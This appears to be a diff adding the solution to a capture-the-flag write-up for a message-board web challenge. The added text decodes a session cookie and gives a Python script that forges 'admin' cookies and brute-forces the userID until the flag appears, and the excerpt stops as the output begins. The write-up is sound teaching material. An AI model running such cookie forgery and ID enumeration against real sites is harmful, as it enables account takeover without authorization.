@@ -8,6 +8,12 @@ Server code is attached (slightly modified).
 
 ## Solution ##
 
+After logging in to the service we notice we have a cookie called `userData` of the form `j%3A%7B%22userID%22%3A%22972%22%2C%22username%22%3A%22kupatergent%22%7D`.
+
+If we URL-decode this cookie we get `j:{"userID":"972","username":"kupatergent"}`.
+
+It is readily apparent that we should change the username to `admin`. I then tried to change the value of `userID` to 0 or 1, but neither seemed to yield the flag. At this point I took a look at the source code of the app:
+
 ```console
 root@osboxes:~/Downloads/message-board-1-master# cat app.js 
 const express = require("express")
@@ -34,6 +40,27 @@ const users = [
 ]
 ```
 
+From the source code it is apparent that the `userID` for admin is 3 digits long. I whipped up a script to brute force the `userID`:
+
+```py
+import requests
+
+url = 'https://message-board.hsc.tf/'
+
+payload_part_1 = 'j%3A%7B%22userID%22%3A%22'
+payload_part_2 = '%22%2C%22username%22%3A%22admin%22%7D'
+
+for i in range(1000):
+    print(i)
+    payload = payload_part_1 + str(i) + payload_part_2
+    cookie = {'userData':payload}
+    r = requests.get(url,cookies=cookie)
+    if 'flag{' in r.text:
+        print(r.text)
+        break
+```
+
+I ran the script and got a hit for `userID=768`:
 
 ```console
 0
